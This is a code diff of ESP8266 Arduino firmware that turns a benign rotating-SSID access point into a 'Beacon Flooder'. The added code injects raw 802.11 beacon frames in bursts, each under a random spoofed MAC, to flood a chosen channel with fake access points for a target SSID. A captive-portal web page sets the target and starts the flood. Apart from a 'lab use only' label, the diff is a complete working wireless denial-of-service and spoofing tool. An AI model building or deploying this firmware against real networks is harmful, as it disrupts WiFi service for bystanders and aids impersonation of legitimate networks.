@@ -1,11 +1,14 @@
 /*
- * Wemos D1 Mini Lite - WiFi Multi-SSID Broadcaster
+ * Wemos D1 Mini Lite - WiFi Beacon Flooder
  *
- * Features:
- * - Boots as open AP with captive portal for configuration
- * - Captive portal redirects all connections to the config web UI
- * - Rotates through multiple broadcast SSIDs configured via the web UI
- * - Persistent storage of SSIDs in EEPROM
+ * FOR USE IN CONTROLLED LAB ENVIRONMENTS ONLY.
+ *
+ * Floods a target WiFi channel with 802.11 beacon frames for a chosen SSID.
+ * Each beacon carries a fresh random locally-administered MAC address so
+ * scanners see many distinct "access points" all advertising the same SSID,
+ * saturating the beacon space on that channel.
+ *
+ * Configuration via built-in captive portal web UI — no router needed.
  */
 
 #include <ESP8266WiFi.h>
@@ -13,118 +16,189 @@
 #include <DNSServer.h>
 #include <EEPROM.h>
 
-// Configuration
-#define MAX_SSIDS 10
-#define SSID_LENGTH 32
-#define SWITCH_INTERVAL 5000  // Switch SSID every 5 seconds
-#define EEPROM_SIZE 512
-#define DNS_PORT 53
+extern "C" {
+  #include "user_interface.h"
+  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
+}
 
-// Default open AP SSID used for initial setup / when no SSIDs are configured
-const char* SETUP_SSID = "WifiBroadcaster";
+// ---------- tunables ----------
+#define EEPROM_SIZE       128
+#define DNS_PORT          53
+#define SSID_MAX_LEN      32
+#define BEACON_BUF_SIZE   100
+#define BEACONS_PER_BURST 50   // raw frames injected per loop iteration
 
-// DNS and web server
-DNSServer dnsServer;
+const char* CONFIG_AP_SSID = "WifiBroadcaster";  // open setup network
+
+// ---------- globals ----------
+DNSServer        dnsServer;
 ESP8266WebServer server(80);
 
-// SSID storage
-struct SSIDConfig {
-  char ssids[MAX_SSIDS][SSID_LENGTH];
-  char password[64];
-  int ssid_count;
-  bool enabled;
+struct Config {
+  char    target_ssid[SSID_MAX_LEN];
+  uint8_t channel;
+  bool    flooding;
+  uint8_t magic;   // 0xAB = valid, anything else = first boot
 };
 
-SSIDConfig config;
-int current_ssid_index = 0;
-unsigned long last_switch_time = 0;
+Config  config;
+uint8_t beacon_buf[BEACON_BUF_SIZE];
+int     beacon_len = 0;
 
-void setup() {
-  Serial.begin(115200);
-  delay(100);
-  Serial.println("\n\nWemos WiFi Broadcaster Starting...");
+/*
+ * Fixed portion of every beacon frame:
+ *   24-byte 802.11 MAC header  +  12-byte beacon fixed fields  =  36 bytes
+ *
+ * SA  (source MAC)  lives at offsets [10-15]
+ * BSSID             lives at offsets [16-21]
+ * Both are overwritten with a fresh random MAC before each tx.
+ */
+const uint8_t BEACON_FIXED[36] = {
+  // 802.11 MAC header
+  0x80, 0x00,                          // Frame Control: management / beacon
+  0x00, 0x00,                          // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA: broadcast
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA   — randomised per packet [10-15]
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID — same as SA           [16-21]
+  0x00, 0x00,                          // Sequence Control
+  // Beacon fixed fields
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+  0x64, 0x00,                          // Beacon Interval: 100 TUs (~102 ms)
+  0x21, 0x04,                          // Capability Info: ESS + short preamble
+};
 
-  // Initialize EEPROM
-  EEPROM.begin(EEPROM_SIZE);
-  loadConfig();
+// -------------------------------------------------------- beacon --
 
-  // Pure AP mode - no router connection required
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP(SETUP_SSID);  // Open network, no password
+/*
+ * Build the beacon template in beacon_buf.
+ * Only needs to be called when target_ssid or channel changes.
+ */
+void prepareBeaconTemplate() {
+  uint8_t ssid_len = strnlen(config.target_ssid, SSID_MAX_LEN);
 
-  IPAddress apIP(192, 168, 4, 1);
-  Serial.print("AP IP address: ");
-  Serial.println(apIP);
-  Serial.print("Connect to open network: ");
-  Serial.println(SETUP_SSID);
+  memcpy(beacon_buf, BEACON_FIXED, 36);
 
-  // Start DNS server - redirect all DNS queries to this device (captive portal)
-  dnsServer.start(DNS_PORT, "*", apIP);
+  int pos = 36;
 
-  // Setup web server routes
-  setupWebServer();
+  // Tag 0: SSID
+  beacon_buf[pos++] = 0x00;
+  beacon_buf[pos++] = ssid_len;
+  memcpy(&beacon_buf[pos], config.target_ssid, ssid_len);
+  pos += ssid_len;
 
-  // Start web server
-  server.begin();
-  Serial.println("Web server started at http://192.168.4.1");
+  // Tag 1: Supported Rates  (1, 2, 5.5, 11, 18, 24, 36, 54 Mbps)
+  beacon_buf[pos++] = 0x01;
+  beacon_buf[pos++] = 0x08;
+  beacon_buf[pos++] = 0x82;  // 1 Mbps  (basic)
+  beacon_buf[pos++] = 0x84;  // 2 Mbps  (basic)
+  beacon_buf[pos++] = 0x8b;  // 5.5 Mbps (basic)
+  beacon_buf[pos++] = 0x96;  // 11 Mbps (basic)
+  beacon_buf[pos++] = 0x24;  // 18 Mbps
+  beacon_buf[pos++] = 0x30;  // 24 Mbps
+  beacon_buf[pos++] = 0x48;  // 36 Mbps
+  beacon_buf[pos++] = 0x6c;  // 54 Mbps
 
-  // Resume broadcasting if it was active before power-off
-  if (config.enabled && config.ssid_count > 0) {
-    switchToSSID(0);
-    last_switch_time = millis();
+  // Tag 3: DS Parameter Set (declares which channel these beacons are on)
+  beacon_buf[pos++] = 0x03;
+  beacon_buf[pos++] = 0x01;
+  beacon_buf[pos++] = config.channel;
+
+  beacon_len = pos;
+}
+
+/*
+ * Inject BEACONS_PER_BURST frames, each with a fresh random MAC.
+ * Locally administered + unicast: MSB of first octet has bit1 set, bit0 clear.
+ */
+void sendBeaconBurst() {
+  if (beacon_len == 0) return;
+  for (int i = 0; i < BEACONS_PER_BURST; i++) {
+    beacon_buf[10] = (random(256) & 0xfe) | 0x02;
+    beacon_buf[11] = random(256);
+    beacon_buf[12] = random(256);
+    beacon_buf[13] = random(256);
+    beacon_buf[14] = random(256);
+    beacon_buf[15] = random(256);
+    memcpy(&beacon_buf[16], &beacon_buf[10], 6);  // BSSID = SA
+    wifi_send_pkt_freedom(beacon_buf, beacon_len, false);
   }
 }
 
-void loop() {
-  dnsServer.processNextRequest();
-  server.handleClient();
+// ------------------------------------------------------- EEPROM --
 
-  // Handle SSID switching if enabled
-  if (config.enabled && config.ssid_count > 0) {
-    unsigned long current_time = millis();
-    if (current_time - last_switch_time >= SWITCH_INTERVAL) {
-      switchToNextSSID();
-      last_switch_time = current_time;
+void saveConfig() {
+  EEPROM.put(0, config);
+  EEPROM.commit();
+}
+
+void loadConfig() {
+  EEPROM.get(0, config);
+  if (config.magic != 0xAB) {
+    strncpy(config.target_ssid, "TargetSSID", SSID_MAX_LEN);
+    config.channel  = 6;
+    config.flooding = false;
+    config.magic    = 0xAB;
+    saveConfig();
+    Serial.println("First boot — defaults written to EEPROM");
+  }
+}
+
+// ----------------------------------------------------- web server --
+
+void handleStatus() {
+  String json = "{";
+  json += "\"flooding\":"  + String(config.flooding ? "true" : "false") + ",";
+  json += "\"ssid\":\""    + String(config.target_ssid) + "\",";
+  json += "\"channel\":"   + String(config.channel);
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
+void handleSetConfig() {
+  bool changed = false;
+
+  if (server.hasArg("ssid")) {
+    String s = server.arg("ssid");
+    s.trim();
+    if (s.length() > 0 && s.length() < SSID_MAX_LEN) {
+      s.toCharArray(config.target_ssid, SSID_MAX_LEN);
+      changed = true;
     }
   }
-}
 
-void switchToSSID(int index) {
-  current_ssid_index = index % config.ssid_count;
-  String ssid = String(config.ssids[current_ssid_index]);
-
-  Serial.print("Broadcasting SSID: ");
-  Serial.println(ssid);
-
-  if (strlen(config.password) > 0) {
-    WiFi.softAP(ssid.c_str(), config.password);
-  } else {
-    WiFi.softAP(ssid.c_str());
+  if (server.hasArg("channel")) {
+    int ch = server.arg("channel").toInt();
+    if (ch >= 1 && ch <= 13) {
+      config.channel = (uint8_t)ch;
+      changed = true;
+    }
   }
+
+  if (changed) {
+    saveConfig();
+    prepareBeaconTemplate();
+    // Restart softAP on the updated channel so raw frames go out on the right channel
+    WiFi.softAP(CONFIG_AP_SSID, "", config.channel);
+    Serial.println("Config updated — SSID: " + String(config.target_ssid)
+                   + "  ch: " + String(config.channel));
+  }
+
+  server.send(200, "text/plain", "OK");
 }
 
-void switchToNextSSID() {
-  if (config.ssid_count == 0) return;
-  switchToSSID((current_ssid_index + 1) % config.ssid_count);
-}
+void handleToggle() {
+  config.flooding = !config.flooding;
+  saveConfig();
 
-void setupWebServer() {
-  // Main config page
-  server.on("/", handleRoot);
+  if (config.flooding) {
+    prepareBeaconTemplate();
+    Serial.println("Flooding ON  — SSID: " + String(config.target_ssid)
+                   + "  ch: " + String(config.channel));
+  } else {
+    Serial.println("Flooding OFF");
+  }
 
-  // API endpoints
-  server.on("/add_ssid", HTTP_POST, handleAddSSID);
-  server.on("/remove_ssid", HTTP_POST, handleRemoveSSID);
-  server.on("/set_password", HTTP_POST, handleSetPassword);
-  server.on("/toggle_broadcast", HTTP_POST, handleToggleBroadcast);
-  server.on("/get_status", HTTP_GET, handleGetStatus);
-  server.on("/clear_all", HTTP_POST, handleClearAll);
-
-  // Captive portal: redirect all unrecognised URLs to the config page
-  server.onNotFound([]() {
-    server.sendHeader("Location", "http://192.168.4.1/", true);
-    server.send(302, "text/plain", "");
-  });
+  server.send(200, "text/plain", config.flooding ? "started" : "stopped");
 }
 
 void handleRoot() {
@@ -132,242 +206,99 @@ void handleRoot() {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WiFi Broadcaster Config</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #f0f0f0;
-        }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #333;
-            border-bottom: 2px solid #4CAF50;
-            padding-bottom: 10px;
-        }
-        .status {
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-            background-color: #e3f2fd;
-        }
-        .status.active {
-            background-color: #c8e6c9;
-        }
-        .ssid-list {
-            list-style: none;
-            padding: 0;
-        }
-        .ssid-item {
-            background-color: #f5f5f5;
-            padding: 10px;
-            margin: 5px 0;
-            border-radius: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .ssid-item.current {
-            background-color: #fff9c4;
-            border: 2px solid #fbc02d;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin: 5px 5px 5px 0;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        button.danger {
-            background-color: #f44336;
-        }
-        button.danger:hover {
-            background-color: #da190b;
-        }
-        button.toggle {
-            background-color: #2196F3;
-        }
-        button.toggle:hover {
-            background-color: #0b7dda;
-        }
-        .form-group {
-            margin: 20px 0;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        .info {
-            background-color: #fff3cd;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-    </style>
+  <title>Beacon Flooder</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
+    .card {
+      background: #16213e; max-width: 480px; margin: 40px auto;
+      padding: 30px; border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    h1 { color: #e94560; margin: 0 0 4px; font-size: 1.6rem; }
+    .sub { color: #666; font-size: 0.78rem; margin-bottom: 24px; }
+    .badge {
+      display: inline-block; padding: 6px 18px; border-radius: 20px;
+      font-weight: bold; font-size: 0.9rem; margin-bottom: 24px;
+      transition: background 0.3s;
+    }
+    .badge.on  { background: #e94560; color: #fff; }
+    .badge.off { background: #2a2a3e; color: #777; }
+    label { display: block; margin-bottom: 5px; font-size: 0.82rem; color: #aaa; letter-spacing: .04em; }
+    input[type=text], select {
+      width: 100%; padding: 10px 12px; margin-bottom: 18px;
+      border: 1px solid #0f3460; border-radius: 6px;
+      background: #0f3460; color: #eee; font-size: 1rem;
+    }
+    .btn {
+      width: 100%; padding: 13px; border: none; border-radius: 6px;
+      font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 6px;
+    }
+    .btn-save   { background: #0f3460; color: #ccc; }
+    .btn-toggle { background: #e94560; color: #fff; }
+    .btn:hover  { filter: brightness(1.15); }
+    .hint { font-size: 0.75rem; color: #555; margin-top: 20px; text-align: center; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>WiFi Broadcaster Configuration</h1>
+  <div class="card">
+    <h1>Beacon Flooder</h1>
+    <div class="sub">Lab use only &mdash; controlled environment</div>
 
-        <div id="status" class="status">
-            <strong>Status:</strong> <span id="broadcast-status">Loading...</span><br>
-            <strong>Current SSID:</strong> <span id="current-ssid">-</span><br>
-            <strong>Total SSIDs:</strong> <span id="total-ssids">0</span><br>
-            <strong>Switch Interval:</strong> 5 seconds
-        </div>
+    <div id="badge" class="badge off">STOPPED</div>
 
-        <div class="form-group">
-            <button onclick="toggleBroadcast()" class="toggle" id="toggle-btn">Toggle Broadcasting</button>
-        </div>
+    <label>TARGET SSID</label>
+    <input type="text" id="ssid" maxlength="31" placeholder="SSID to flood">
 
-        <h2>Broadcast SSIDs</h2>
-        <div class="info">
-            Add the SSIDs you want to broadcast below. The device will rotate through them every 5 seconds.
-        </div>
+    <label>CHANNEL</label>
+    <select id="channel">
+      <option>1</option><option>2</option><option>3</option><option>4</option>
+      <option>5</option><option>6</option><option>7</option><option>8</option>
+      <option>9</option><option>10</option><option>11</option><option>12</option>
+      <option>13</option>
+    </select>
 
-        <ul id="ssid-list" class="ssid-list">
-            <!-- SSIDs will be loaded here -->
-        </ul>
+    <button class="btn btn-save"   onclick="saveConfig()">Save Config</button>
+    <button class="btn btn-toggle" id="toggleBtn" onclick="toggle()">Start Flooding</button>
 
-        <div class="form-group">
-            <label for="new-ssid">Add New SSID:</label>
-            <input type="text" id="new-ssid" placeholder="Enter SSID name" maxlength="31">
-            <button onclick="addSSID()">Add SSID</button>
-        </div>
+    <div class="hint">Reconnect to <strong>WifiBroadcaster</strong> then visit 192.168.4.1 to reconfigure</div>
+  </div>
 
-        <div class="form-group">
-            <label for="ap-password">Access Point Password (optional):</label>
-            <input type="password" id="ap-password" placeholder="Leave empty for open network" maxlength="63">
-            <button onclick="setPassword()">Set Password</button>
-        </div>
-
-        <div class="form-group">
-            <button onclick="clearAll()" class="danger">Clear All SSIDs</button>
-        </div>
-    </div>
-
-    <script>
-        function updateStatus() {
-            fetch('/get_status')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('broadcast-status').textContent = data.enabled ? 'Broadcasting' : 'Stopped';
-                    document.getElementById('current-ssid').textContent = data.current_ssid || '-';
-                    document.getElementById('total-ssids').textContent = data.ssid_count;
-
-                    const statusDiv = document.getElementById('status');
-                    if (data.enabled) {
-                        statusDiv.classList.add('active');
-                    } else {
-                        statusDiv.classList.remove('active');
-                    }
-
-                    const ssidList = document.getElementById('ssid-list');
-                    ssidList.innerHTML = '';
-
-                    data.ssids.forEach((ssid, index) => {
-                        const li = document.createElement('li');
-                        li.className = 'ssid-item';
-                        if (index === data.current_index) {
-                            li.classList.add('current');
-                        }
-
-                        li.innerHTML = `
-                            <span>${ssid}</span>
-                            <button onclick="removeSSID(${index})" class="danger">Remove</button>
-                        `;
-                        ssidList.appendChild(li);
-                    });
-                })
-                .catch(err => console.error('Error fetching status:', err));
+  <script>
+    function refresh() {
+      fetch('/status').then(r => r.json()).then(d => {
+        document.getElementById('ssid').value    = d.ssid;
+        document.getElementById('channel').value = String(d.channel);
+        const badge = document.getElementById('badge');
+        const btn   = document.getElementById('toggleBtn');
+        if (d.flooding) {
+          badge.textContent = 'FLOODING'; badge.className = 'badge on';
+          btn.textContent   = 'Stop Flooding';
+        } else {
+          badge.textContent = 'STOPPED';  badge.className = 'badge off';
+          btn.textContent   = 'Start Flooding';
         }
+      });
+    }
 
-        function addSSID() {
-            const ssid = document.getElementById('new-ssid').value.trim();
-            if (!ssid) {
-                alert('Please enter an SSID');
-                return;
-            }
+    function saveConfig() {
+      const body = 'ssid='     + encodeURIComponent(document.getElementById('ssid').value.trim())
+                 + '&channel=' + document.getElementById('channel').value;
+      fetch('/set_config', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body
+      }).then(() => refresh());
+    }
 
-            fetch('/add_ssid', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'ssid=' + encodeURIComponent(ssid)
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('new-ssid').value = '';
-                updateStatus();
-            })
-            .catch(err => console.error('Error adding SSID:', err));
-        }
+    function toggle() {
+      fetch('/toggle', {method: 'POST'}).then(() => refresh());
+    }
 
-        function removeSSID(index) {
-            fetch('/remove_ssid', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'index=' + index
-            })
-            .then(() => updateStatus())
-            .catch(err => console.error('Error removing SSID:', err));
-        }
-
-        function setPassword() {
-            const password = document.getElementById('ap-password').value;
-
-            fetch('/set_password', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'password=' + encodeURIComponent(password)
-            })
-            .then(response => response.text())
-            .then(data => {
-                alert('Password updated');
-                document.getElementById('ap-password').value = '';
-            })
-            .catch(err => console.error('Error setting password:', err));
-        }
-
-        function toggleBroadcast() {
-            fetch('/toggle_broadcast', {method: 'POST'})
-                .then(() => updateStatus())
-                .catch(err => console.error('Error toggling broadcast:', err));
-        }
-
-        function clearAll() {
-            if (confirm('Are you sure you want to clear all SSIDs?')) {
-                fetch('/clear_all', {method: 'POST'})
-                    .then(() => updateStatus())
-                    .catch(err => console.error('Error clearing SSIDs:', err));
-            }
-        }
-
-        // Update status every 2 seconds
-        setInterval(updateStatus, 2000);
-        updateStatus();
-    </script>
+    setInterval(refresh, 2000);
+    refresh();
+  </script>
 </body>
 </html>
 )rawliteral";
@@ -375,135 +306,54 @@ void handleRoot() {
   server.send(200, "text/html", html);
 }
 
-void handleGetStatus() {
-  String json = "{";
-  json += "\"enabled\":" + String(config.enabled ? "true" : "false") + ",";
-  json += "\"ssid_count\":" + String(config.ssid_count) + ",";
-  json += "\"current_index\":" + String(current_ssid_index) + ",";
-  json += "\"current_ssid\":\"" + (config.ssid_count > 0 ? String(config.ssids[current_ssid_index]) : "") + "\",";
-  json += "\"ssids\":[";
+void setupWebServer() {
+  server.on("/",           HTTP_GET,  handleRoot);
+  server.on("/status",     HTTP_GET,  handleStatus);
+  server.on("/set_config", HTTP_POST, handleSetConfig);
+  server.on("/toggle",     HTTP_POST, handleToggle);
 
-  for (int i = 0; i < config.ssid_count; i++) {
-    if (i > 0) json += ",";
-    json += "\"" + String(config.ssids[i]) + "\"";
-  }
-
-  json += "]}";
-
-  server.send(200, "application/json", json);
+  // Captive portal: redirect everything else to the config page
+  server.onNotFound([]() {
+    server.sendHeader("Location", "http://192.168.4.1/", true);
+    server.send(302, "text/plain", "");
+  });
 }
 
-void handleAddSSID() {
-  if (server.hasArg("ssid")) {
-    String ssid = server.arg("ssid");
+// -------------------------------------------------- setup / loop --
 
-    if (config.ssid_count < MAX_SSIDS && ssid.length() > 0 && ssid.length() < SSID_LENGTH) {
-      ssid.toCharArray(config.ssids[config.ssid_count], SSID_LENGTH);
-      config.ssid_count++;
-      saveConfig();
+void setup() {
+  Serial.begin(115200);
+  randomSeed(micros());
+  delay(100);
+  Serial.println("\n\nBeacon Flooder starting...");
 
-      server.send(200, "text/plain", "SSID added");
-      Serial.println("SSID added: " + ssid);
-    } else {
-      server.send(400, "text/plain", "Invalid SSID or limit reached");
-    }
-  } else {
-    server.send(400, "text/plain", "Missing SSID parameter");
-  }
-}
+  EEPROM.begin(EEPROM_SIZE);
+  loadConfig();
 
-void handleRemoveSSID() {
-  if (server.hasArg("index")) {
-    int index = server.arg("index").toInt();
+  // Pure AP mode on the configured channel — no router connection
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(CONFIG_AP_SSID, "", config.channel);
 
-    if (index >= 0 && index < config.ssid_count) {
-      // Shift SSIDs down
-      for (int i = index; i < config.ssid_count - 1; i++) {
-        strcpy(config.ssids[i], config.ssids[i + 1]);
-      }
-      config.ssid_count--;
+  Serial.println("Config AP : " + String(CONFIG_AP_SSID) + "  ch: " + String(config.channel));
+  Serial.println("UI        : http://192.168.4.1");
+  Serial.println("Target    : " + String(config.target_ssid));
 
-      // Adjust current index if needed
-      if (current_ssid_index >= config.ssid_count && config.ssid_count > 0) {
-        current_ssid_index = 0;
-      }
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+  setupWebServer();
+  server.begin();
 
-      saveConfig();
-      server.send(200, "text/plain", "SSID removed");
-    } else {
-      server.send(400, "text/plain", "Invalid index");
-    }
-  } else {
-    server.send(400, "text/plain", "Missing index parameter");
+  prepareBeaconTemplate();
+
+  if (config.flooding) {
+    Serial.println("Resuming flood on boot");
   }
 }
 
-void handleSetPassword() {
-  if (server.hasArg("password")) {
-    String password = server.arg("password");
-
-    if (password.length() < 64) {
-      password.toCharArray(config.password, 64);
-      saveConfig();
-      server.send(200, "text/plain", "Password set");
-      Serial.println("Password updated");
-    } else {
-      server.send(400, "text/plain", "Password too long");
-    }
-  } else {
-    server.send(400, "text/plain", "Missing password parameter");
+void loop() {
+  if (config.flooding && beacon_len > 0) {
+    sendBeaconBurst();
   }
-}
-
-void handleToggleBroadcast() {
-  config.enabled = !config.enabled;
-
-  if (config.enabled && config.ssid_count > 0) {
-    switchToSSID(0);
-    last_switch_time = millis();
-    Serial.println("Broadcasting enabled");
-  } else {
-    // Revert to the default open setup SSID
-    WiFi.softAP(SETUP_SSID);
-    Serial.println("Broadcasting disabled, reverted to: " + String(SETUP_SSID));
-  }
-
-  saveConfig();
-  server.send(200, "text/plain", config.enabled ? "Broadcasting started" : "Broadcasting stopped");
-}
-
-void handleClearAll() {
-  config.ssid_count = 0;
-  config.enabled = false;
-  current_ssid_index = 0;
-
-  // Revert to the default open setup SSID
-  WiFi.softAP(SETUP_SSID);
-
-  saveConfig();
-  server.send(200, "text/plain", "All SSIDs cleared");
-  Serial.println("All SSIDs cleared, reverted to: " + String(SETUP_SSID));
-}
-
-void saveConfig() {
-  EEPROM.put(0, config);
-  EEPROM.commit();
-  Serial.println("Configuration saved");
-}
-
-void loadConfig() {
-  EEPROM.get(0, config);
-
-  // Validate loaded data
-  if (config.ssid_count < 0 || config.ssid_count > MAX_SSIDS) {
-    Serial.println("Invalid config, initializing defaults");
-    config.ssid_count = 0;
-    config.enabled = false;
-    memset(config.password, 0, 64);
-    saveConfig();
-  } else {
-    Serial.println("Configuration loaded");
-    Serial.print("SSIDs: ");
-    Serial.println(config.ssid_count);
-  }
+  dnsServer.processNextRequest();
+  server.handleClient();
+  yield();
 }
